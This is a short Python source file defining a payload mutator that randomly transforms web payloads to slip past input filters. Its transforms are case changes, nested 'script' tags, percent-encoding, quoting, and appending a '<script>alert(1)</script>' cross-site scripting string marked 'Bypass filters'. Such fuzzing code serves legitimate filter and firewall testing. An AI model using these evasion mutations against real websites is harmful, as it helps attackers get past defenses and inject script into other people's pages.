import random
import string

class PayloadMutator:
    def mutate(self, payload):
        funcs = [
            lambda p: p.upper(),
            lambda p: p.replace("script", "scr<script>ipt"),
            lambda p: ''.join(f"%{ord(c):02x}" for c in p),
            lambda p: p.replace("<", "&lt;").replace(">", "&gt;") + "<script>alert(1)</script>",  # Bypass filters
            lambda p: f"\"{p}\"",
            lambda p: f"'{p}'",
            lambda p: ''.join(random.choice(string.ascii_letters + string.digits) if c.isalnum() else c for c in p),  # Randomize alnum
        ]
        return random.choice(funcs)(payload)